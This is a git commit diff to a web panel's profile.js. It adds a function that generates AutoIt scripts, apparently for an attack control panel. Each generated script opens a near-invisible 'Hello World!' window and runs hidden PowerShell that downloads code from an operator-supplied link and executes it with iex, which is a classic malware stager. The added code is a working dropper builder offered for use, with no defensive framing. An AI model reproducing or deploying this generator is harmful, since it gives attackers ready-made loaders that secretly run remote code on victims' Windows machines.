c407bc3073b383e2ee65bdf47ed46fae6a3cabca
kira kira <kira2040k@gmail.com>
2022-08-25 23:44:42 +0300

    add autoit

--- public/assets/profile.js
+++ public/assets/profile.js
@@ -21,11 +21,52 @@ function change_password_send(){
         }
     }
 }
+function open_autoit(){
+    let form = document.getElementById('open_autoit_div');
+    if(form.style.display == "block") form.style.display = "none";
+    else form.style.display = 'block';
+}
 
 function open_auto_command(){
     let form = document.getElementById('auto_command_div');
     if(form.style.display == "block") form.style.display = "none";
     else form.style.display = 'block';
+}
+
+function autoit_run(){
+    let text = `#include <GUIConstantsEx.au3>
+    #include <StaticConstants.au3>
+    
+    Opt("MouseCoordMode", 2)
+    
+    Local $child,$CLOSE
+    $child = _GUICreate("Hello World!",1,1+1)
+    
+    Func _GUICreate($title,$width,$height,$left = Default,$top = Default)
+        $child = GUICreate($title,$width,$height,$left,$top,0x80000000)
+        $CmdPid = Run('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command  "'&"(New-Object System.Net.WebClient).DownloadString('powershell_link') | iex"&'"',@DesktopDir, @SW_SHOW)
+    
+        _GuiCreateTitleBar("a",0)
+    EndFunc
+    
+    
+    
+    Func _GuiCreateTitleBar($title,$width)
+        GUICtrlCreateLabel($title, 3,3)
+        GUICtrlSetColor(-1, 0xffffff)
+        GUICtrlSetBkColor(-1, -2)
+        $CLOSE = GUICtrlCreateLabel("X", $width - 15,3)
+        GUICtrlSetColor(-1, 0xcc0000)
+        GUICtrlSetBkColor(-1, -2)
+    EndFunc   ;==>_GuiCreateButton
+    
+    GUISetState()
+    
+    
+    `
+    
+    text = text.replace("powershell_link",document.getElementById("powershell_link").value)
+    document.getElementById("textarea_form").innerHTML = text 
 }
 
 
